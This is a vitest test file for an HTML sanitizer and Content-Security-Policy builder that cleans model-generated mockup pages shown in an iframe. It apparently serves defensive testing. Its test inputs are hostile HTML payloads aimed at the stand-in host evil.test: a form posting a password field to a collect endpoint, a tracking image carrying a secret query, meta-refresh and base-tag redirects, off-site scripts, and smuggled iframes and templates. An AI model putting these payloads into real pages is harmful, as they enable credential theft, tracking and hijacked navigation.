import { describe, expect, it } from 'vitest'
import { buildCsp, sanitizeMockupHtml, TAILWIND_CDN } from '../sanitizeHtml'

/**
 * A hostile corpus. The visitor writes the prompt, so the model's HTML is
 * effectively attacker-influenced input -- every case here is something a person
 * could talk the model into emitting.
 */

const cspFirst = (html: string) => {
  const head = html.slice(html.indexOf('<head>') + 6, html.indexOf('</head>'))
  return head.trimStart().startsWith('<meta http-equiv="Content-Security-Policy"')
}

describe('CSP placement -- the whole reason we reconstruct instead of scrub', () => {
  const cases: Record<string, string> = {
    'well-formed document': '<!DOCTYPE html><html><head><title>T</title></head><body><p>hi</p></body></html>',
    'no head element at all': '<html><body><p>hi</p></body></html>',
    'no html or body element': '<p>just a fragment</p>',
    'uppercase HEAD': '<HTML><HEAD><TITLE>T</TITLE></HEAD><BODY><P>hi</P></BODY></HTML>',
    'head with attributes and spacing': '<html><head lang="en" >\n<title>T</title></head><body>x</body></html>',
    'a commented-out head appearing first': '<!-- <head>decoy</head> --><html><head><title>T</title></head><body>x</body></html>',
    'content before <html>': 'stray text<html><head></head><body><p>hi</p></body></html>',
    'script before the head': '<script>window.x=1</script><html><head></head><body>x</body></html>',
    'doctype only': '<!DOCTYPE html>',
    'empty string': '',
  }

  for (const [name, raw] of Object.entries(cases)) {
    it(`puts the CSP first for: ${name}`, () => {
      const { html } = sanitizeMockupHtml(raw)
      expect(cspFirst(html)).toBe(true)
      expect(html.startsWith('<!DOCTYPE html>')).toBe(true)
    })
  }
})

describe('navigation escapes -- not covered by any CSP directive', () => {
  it('drops <base>, which would redirect every relative URL', () => {
    const { html } = sanitizeMockupHtml('<html><head><base href="https://evil.test/"></head><body>x</body></html>')
    expect(html).not.toMatch(/<base/i)
  })

  it('drops <meta http-equiv="refresh">', () => {
    const { html } = sanitizeMockupHtml(
      '<html><head><meta http-equiv="refresh" content="0;url=https://evil.test"></head><body>x</body></html>',
    )
    expect(html.toLowerCase()).not.toContain('refresh')
  })

  it('drops a refresh meta with reordered attributes and odd casing', () => {
    const { html } = sanitizeMockupHtml(
      '<html><body><META CONTENT="0; url=https://evil.test" HTTP-EQUIV=refresh></body></html>',
    )
    expect(html.toLowerCase()).not.toContain('evil.test')
  })

  it('rewrites off-site links to # so the frame cannot navigate itself away', () => {
    const { html } = sanitizeMockupHtml('<html><body><a href="https://evil.test/login">Sign in</a></body></html>')
    expect(html).not.toContain('evil.test')
    expect(html).toContain('href="#"')
  })

  it('neutralises javascript: hrefs', () => {
    const { html } = sanitizeMockupHtml('<html><body><a href="javascript:fetch(1)">go</a></body></html>')
    expect(html).not.toContain('javascript:')
  })

  it('strips target and download from links', () => {
    const { html } = sanitizeMockupHtml('<html><body><a href="#" target="_blank" download="x.html">save</a></body></html>')
    // Matched against the anchor rather than the whole document: the injected click
    // interceptor legitimately mentions e.target, and a bare substring check would
    // fail on that while saying nothing about the attribute this test is about.
    expect(html).not.toMatch(/<a\b[^>]*\bdownload\b/)
    expect(html).not.toMatch(/<a\b[^>]*\btarget=/)
    expect(html).not.toContain('_blank')
    expect(html).not.toContain('x.html')
  })

  it('injects a click interceptor, because href="#" NAVIGATES inside a srcdoc frame', () => {
    // The frame's base URL is the embedder's, not about:srcdoc, so "#" resolves to
    // the studio's own URL and a click loaded the whole studio into its own preview.
    // Rewriting hrefs to "#" is what CREATES this case, so the two must ship together.
    const { html } = sanitizeMockupHtml('<html><body><a href="https://evil.test">go</a></body></html>')
    expect(html).toContain("closest('a[href]')")
    expect(html).toContain('e.preventDefault()')
    // Capture phase, so it beats the mockup's own handlers to the default action.
    expect(html).toContain('}, true)')
    // stopPropagation would break tab switching and modals, which inline script
    // is permitted specifically to support.
    expect(html).not.toContain('stopPropagation')
  })

  it('preserves everything multi-page navigation depends on', () => {
    // The generated router switches pages by toggling `hidden` on [data-page]
    // sections from a delegated [data-nav] click. If a future tightening of the
    // attribute filter drops any of these, every nav item silently stops working
    // and no test elsewhere would notice.
    const { html } = sanitizeMockupHtml(
      '<html><body><nav><a href="#" data-nav="home" aria-current="page" class="aria-[current=page]:bg-white/10">Home</a>' +
        '<a href="#" data-nav="contacts">Contacts</a></nav>' +
        '<main><section data-page="home">A</section><section data-page="contacts" hidden>B</section></main>' +
        '</body></html>',
    )
    expect(html).toContain('data-page="home"')
    expect(html).toContain('data-page="contacts"')
    expect(html).toContain('data-nav="contacts"')
    expect(html).toContain('aria-current="page"')
    expect(html).toContain('aria-[current=page]:bg-white/10')
    expect(html).toMatch(/<section data-page="contacts"[^>]*hidden/)
  })

  it('keeps a body script but drops a head script -- where the router must live', () => {
    // <head> is rebuilt from scratch, so a router placed there vanishes without a
    // trace. This is the single assumption the multi-page prompt rests on.
    const router = "document.querySelectorAll('[data-page]')"
    const inBody = sanitizeMockupHtml(`<html><body><div>x</div><script>${router}</script></body></html>`)
    expect(inBody.html).toContain(router)

    const inHead = sanitizeMockupHtml(`<html><head><script>${router}</script></head><body>x</body></html>`)
    expect(inHead.html).not.toContain(router)
  })

  it('keeps fragment links working by scrolling within the frame', () => {
    const { html } = sanitizeMockupHtml('<html><body><a href="#pricing">Pricing</a><div id="pricing">x</div></body></html>')
    expect(html).toContain('href="#pricing"')
    expect(html).toContain('scrollIntoView')
  })
})

describe('script sources', () => {
  it('keeps Tailwind but forces the pinned URL', () => {
    // The bare origin 302-redirects, and CSP waives the path component across a
    // redirect -- so an unpinned URL would both float the version and weaken the
    // policy it is meant to match.
    const { html } = sanitizeMockupHtml(
      '<html><head><script src="https://cdn.tailwindcss.com"></script></head><body>x</body></html>',
    )
    expect(html).toContain(`<script src="${TAILWIND_CDN}"></script>`)
    expect(html).not.toContain('"https://cdn.tailwindcss.com"')
  })

  it('drops an arbitrary npm package from unpkg', () => {
    // unpkg proxies the whole npm registry, so allowlisting its origin would be
    // an unrestricted script grant. It is not in the policy and not in the output.
    const { html } = sanitizeMockupHtml(
      '<html><body><script src="https://unpkg.com/evil-package@1/dist/x.js"></script></body></html>',
    )
    expect(html).not.toContain('unpkg.com')
    expect(buildCsp(true)).not.toContain('unpkg')
  })

  it('drops any other third-party script', () => {
    const { html } = sanitizeMockupHtml('<html><body><script src="https://evil.test/x.js"></script></body></html>')
    expect(html).not.toContain('evil.test')
  })

  it('keeps inline scripts, which the mockups genuinely need', () => {
    const { html } = sanitizeMockupHtml(
      '<html><body><script>document.querySelector("#tab").onclick = () => {}</script></body></html>',
    )
    expect(html).toContain('onclick')
  })
})

describe('nested browsing contexts and plugins', () => {
  for (const tag of ['iframe', 'object', 'embed', 'frame', 'frameset']) {
    it(`drops <${tag}>`, () => {
      const { html } = sanitizeMockupHtml(`<html><body><${tag} src="https://evil.test"></${tag}></body></html>`)
      expect(html).not.toContain('evil.test')
      expect(html.toLowerCase()).not.toContain(`<${tag}`)
    })
  }

  it('drops a nested iframe carrying its own srcdoc', () => {
    const { html } = sanitizeMockupHtml(
      `<html><body><iframe srcdoc="&lt;script&gt;location='https://evil.test'&lt;/script&gt;"></iframe></body></html>`,
    )
    expect(html).not.toContain('srcdoc')
  })
})

describe('stylesheets and images', () => {
  it('keeps a Google Fonts stylesheet', () => {
    const { html } = sanitizeMockupHtml(
      '<html><head><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter"></head><body>x</body></html>',
    )
    expect(html).toContain('fonts.googleapis.com/css2?family=Inter')
  })

  it('drops a third-party stylesheet', () => {
    const { html } = sanitizeMockupHtml(
      '<html><head><link rel="stylesheet" href="https://evil.test/x.css"></head><body>x</body></html>',
    )
    expect(html).not.toContain('evil.test')
  })

  it('keeps picsum images', () => {
    const { html } = sanitizeMockupHtml('<html><body><img src="https://picsum.photos/seed/a/80/80" alt="a"></body></html>')
    expect(html).toContain('picsum.photos/seed/a/80/80')
  })

  it('blanks an off-allowlist image but keeps the element so layout survives', () => {
    const { html } = sanitizeMockupHtml('<html><body><img src="https://evil.test/track.gif?d=secret" alt="x"></body></html>')
    expect(html).not.toContain('evil.test')
    expect(html).toContain('<img')
    expect(html).toContain('background:#e5e7eb')
  })

  it('drops image origins entirely when the image CDN is disabled', () => {
    const { html } = sanitizeMockupHtml('<html><body><img src="https://picsum.photos/seed/a/80/80"></body></html>', {
      allowImageCdn: false,
    })
    expect(html).not.toContain('picsum.photos')
    expect(buildCsp(false)).toContain('img-src data:')
  })
})

describe('forms', () => {
  it('strips the action and hard-disables submission', () => {
    const { html } = sanitizeMockupHtml(
      '<html><body><form action="https://evil.test/collect" method="post"><input name="pw"></form></body></html>',
    )
    expect(html).not.toContain('evil.test')
    expect(html).not.toContain('method=')
    expect(html).toContain('onsubmit="return false"')
  })
})

describe('the policy itself', () => {
  it('denies by default and blocks every fetch-family egress', () => {
    const csp = buildCsp(true)
    expect(csp).toContain("default-src 'none'")
    expect(csp).toContain("connect-src 'none'")
    expect(csp).toContain("form-action 'none'")
    expect(csp).toContain("base-uri 'none'")
    expect(csp).toContain("object-src 'none'")
    expect(csp).toContain("worker-src 'none'")
  })
})

describe('robustness', () => {
  it('never throws on malformed markup', () => {
    const malformed = ['<div<script>', '<<<>>>', '<html', '</body></html>', ' ￿', '<p>'.repeat(5000)]
    for (const raw of malformed) {
      expect(() => sanitizeMockupHtml(raw)).not.toThrow()
    }
  })

  it('escapes a title carrying markup', () => {
    const { html } = sanitizeMockupHtml(
      '<html><head><title></title><script>alert(1)</script></title></head><body>x</body></html>',
    )
    const title = /<title>([\s\S]*?)<\/title>/.exec(html)?.[1] ?? ''
    expect(title).not.toContain('<script')
  })

  it('reports byte length in UTF-8', () => {
    const { html, bytes } = sanitizeMockupHtml('<html><body><p>\u{1F3A8}\u{1F3A8}\u{1F3A8}</p></body></html>')
    expect(bytes).toBe(Buffer.byteLength(html, 'utf8'))
    expect(bytes).toBeGreaterThan(html.length)
  })
})

describe('template content', () => {
  // parse5 hangs a template's children off `.content`, not `childNodes`, so a
  // recursive walk that only follows childNodes skips every rule while
  // serialize() still emits the markup. Template content is inert until cloned,
  // and model-emitted inline JS can clone it.
  it('drops a template smuggling a script, an iframe, a base and an off-site link', () => {
    const { html } = sanitizeMockupHtml(
      `<html><body><template>
         <script src="https://evil.test/x.js"></script>
         <iframe src="https://evil.test"></iframe>
         <base href="https://evil.test/">
         <a href="https://evil.test">click</a>
         <meta http-equiv="refresh" content="0;url=https://evil.test">
       </template></body></html>`,
    )
    expect(html).not.toContain('evil.test')
    expect(html.toLowerCase()).not.toContain('<template')
  })
})

describe('srcset', () => {
  it('strips a disallowed srcset even when src is allowed', () => {
    const { html } = sanitizeMockupHtml(
      '<html><body><img src="https://picsum.photos/seed/a/80/80" srcset="https://evil.test/a.png 1x"></body></html>',
    )
    expect(html).not.toContain('evil.test')
    expect(html).toContain('picsum.photos/seed/a/80/80')
  })

  it('keeps a <picture><source> whose srcset is allowed', () => {
    // <source> has no src at all, so judging it on src alone blanked every
    // legitimate one.
    const { html } = sanitizeMockupHtml(
      '<html><body><picture><source srcset="https://picsum.photos/seed/b/800/600"><img src="https://picsum.photos/seed/b/400/300" alt="b"></picture></body></html>',
    )
    expect(html).toContain('picsum.photos/seed/b/800/600')
    expect(html).not.toContain('background:#e5e7eb')
  })

  it('drops a source whose srcset is not allowed', () => {
    const { html } = sanitizeMockupHtml(
      '<html><body><picture><source srcset="https://evil.test/a.png 2x"></picture></body></html>',
    )
    expect(html).not.toContain('evil.test')
  })
})
